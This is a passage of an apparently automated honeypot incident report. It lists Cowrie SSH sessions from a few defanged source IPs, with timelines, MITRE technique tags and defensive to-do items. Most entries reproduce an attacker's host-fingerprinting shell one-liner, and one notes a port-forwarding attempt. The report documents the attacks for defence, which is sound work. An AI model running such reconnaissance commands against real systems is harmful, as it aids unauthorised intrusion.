| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:42:56` | `cowrie.session.connect` |
| `2026-07-06 03:42:56` | `cowrie.client.version` |
| `2026-07-06 03:42:56` | `cowrie.client.kex` |
| `2026-07-06 03:42:58` | `cowrie.login.success` |
| `2026-07-06 03:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.92.102[.]164` to AbuseIPDB if not already reported
- [ ] Block `1.92.102[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44989eeb896b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:43 |
| **Last Seen** | 2026-07-06 03:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:43:19` | `cowrie.session.connect` |
| `2026-07-06 03:43:19` | `cowrie.client.version` |
| `2026-07-06 03:43:19` | `cowrie.client.kex` |
| `2026-07-06 03:43:22` | `cowrie.login.success` |
| `2026-07-06 03:43:24` | `cowrie.session.params` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.success` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.command.input` |
| `2026-07-06 03:43:24` | `cowrie.log.closed` |
| `2026-07-06 03:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a19f12749970

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:44 |
| **Last Seen** | 2026-07-06 03:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:44:15` | `cowrie.session.connect` |
| `2026-07-06 03:44:16` | `cowrie.client.version` |
| `2026-07-06 03:44:16` | `cowrie.client.kex` |
| `2026-07-06 03:44:19` | `cowrie.login.success` |
| `2026-07-06 03:44:20` | `cowrie.session.params` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.success` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:20` | `cowrie.command.input` |
| `2026-07-06 03:44:21` | `cowrie.log.closed` |
| `2026-07-06 03:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85405d642a44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:45 |
| **Last Seen** | 2026-07-06 03:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:45:12` | `cowrie.session.connect` |
| `2026-07-06 03:45:12` | `cowrie.client.version` |
| `2026-07-06 03:45:12` | `cowrie.client.kex` |
| `2026-07-06 03:45:15` | `cowrie.login.success` |
| `2026-07-06 03:45:16` | `cowrie.session.params` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.success` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:16` | `cowrie.command.input` |
| `2026-07-06 03:45:17` | `cowrie.log.closed` |
| `2026-07-06 03:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b41d853422

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:46 |
| **Last Seen** | 2026-07-06 03:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:46:09` | `cowrie.session.connect` |
| `2026-07-06 03:46:10` | `cowrie.client.version` |
| `2026-07-06 03:46:10` | `cowrie.client.kex` |
| `2026-07-06 03:46:12` | `cowrie.login.success` |
| `2026-07-06 03:46:14` | `cowrie.session.params` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.success` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:14` | `cowrie.command.input` |
| `2026-07-06 03:46:15` | `cowrie.log.closed` |
| `2026-07-06 03:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d4a8b1bedd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:47 |
| **Last Seen** | 2026-07-06 03:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:47:04` | `cowrie.session.connect` |
| `2026-07-06 03:47:05` | `cowrie.client.version` |
| `2026-07-06 03:47:05` | `cowrie.client.kex` |
| `2026-07-06 03:47:07` | `cowrie.login.success` |
| `2026-07-06 03:47:09` | `cowrie.session.params` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.success` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:09` | `cowrie.command.input` |
| `2026-07-06 03:47:10` | `cowrie.log.closed` |
| `2026-07-06 03:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb02640c0c6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 03:47 |
| **Last Seen** | 2026-07-06 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:47:55` | `cowrie.session.connect` |
| `2026-07-06 03:47:55` | `cowrie.client.version` |
| `2026-07-06 03:47:55` | `cowrie.client.kex` |
| `2026-07-06 03:47:55` | `cowrie.login.success` |
| `2026-07-06 03:47:55` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:47:55` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0c7db6e59f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:48 |
| **Last Seen** | 2026-07-06 03:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:48:01` | `cowrie.session.connect` |
| `2026-07-06 03:48:01` | `cowrie.client.version` |
| `2026-07-06 03:48:01` | `cowrie.client.kex` |
| `2026-07-06 03:48:03` | `cowrie.login.success` |
| `2026-07-06 03:48:05` | `cowrie.session.params` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.success` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:05` | `cowrie.command.input` |
| `2026-07-06 03:48:06` | `cowrie.log.closed` |
| `2026-07-06 03:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aebaaca07a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:48 |
| **Last Seen** | 2026-07-06 03:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:48:56` | `cowrie.session.connect` |
| `2026-07-06 03:48:56` | `cowrie.client.version` |
| `2026-07-06 03:48:56` | `cowrie.client.kex` |
| `2026-07-06 03:48:58` | `cowrie.login.success` |
| `2026-07-06 03:49:00` | `cowrie.session.params` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.success` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:00` | `cowrie.command.input` |
| `2026-07-06 03:49:01` | `cowrie.log.closed` |
| `2026-07-06 03:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55f07ebf98c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 03:49 |
| **Last Seen** | 2026-07-06 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:49:38` | `cowrie.session.connect` |
| `2026-07-06 03:49:38` | `cowrie.client.version` |
| `2026-07-06 03:49:38` | `cowrie.client.kex` |
| `2026-07-06 03:49:38` | `cowrie.login.success` |
| `2026-07-06 03:49:39` | `cowrie.session.params` |
| `2026-07-06 03:49:39` | `cowrie.command.input` |
| `2026-07-06 03:49:39` | `cowrie.log.closed` |
| `2026-07-06 03:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11fd8a4ba6f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:49 |
| **Last Seen** | 2026-07-06 03:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:49:51` | `cowrie.session.connect` |
| `2026-07-06 03:49:51` | `cowrie.client.version` |
| `2026-07-06 03:49:51` | `cowrie.client.kex` |
| `2026-07-06 03:49:54` | `cowrie.login.success` |
| `2026-07-06 03:49:56` | `cowrie.session.params` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.success` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:56` | `cowrie.command.input` |
| `2026-07-06 03:49:57` | `cowrie.log.closed` |
| `2026-07-06 03:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb80244f0f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:50 |
| **Last Seen** | 2026-07-06 03:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:50:48` | `cowrie.session.connect` |
| `2026-07-06 03:50:48` | `cowrie.client.version` |
| `2026-07-06 03:50:48` | `cowrie.client.kex` |
| `2026-07-06 03:50:51` | `cowrie.login.success` |
| `2026-07-06 03:50:53` | `cowrie.session.params` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.success` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.command.input` |
| `2026-07-06 03:50:53` | `cowrie.log.closed` |
| `2026-07-06 03:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e921a205910

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:51 |
| **Last Seen** | 2026-07-06 03:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:51:44` | `cowrie.session.connect` |
| `2026-07-06 03:51:44` | `cowrie.client.version` |
| `2026-07-06 03:51:44` | `cowrie.client.kex` |
| `2026-07-06 03:51:46` | `cowrie.login.success` |
| `2026-07-06 03:51:48` | `cowrie.session.params` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.success` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:48` | `cowrie.command.input` |
| `2026-07-06 03:51:49` | `cowrie.log.closed` |
| `2026-07-06 03:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619fb624a129

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:52 |
| **Last Seen** | 2026-07-06 03:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:52:39` | `cowrie.session.connect` |
| `2026-07-06 03:52:39` | `cowrie.client.version` |
| `2026-07-06 03:52:39` | `cowrie.client.kex` |
| `2026-07-06 03:52:41` | `cowrie.login.success` |
| `2026-07-06 03:52:43` | `cowrie.session.params` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.success` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
| `2026-07-06 03:52:43` | `cowrie.command.input` |
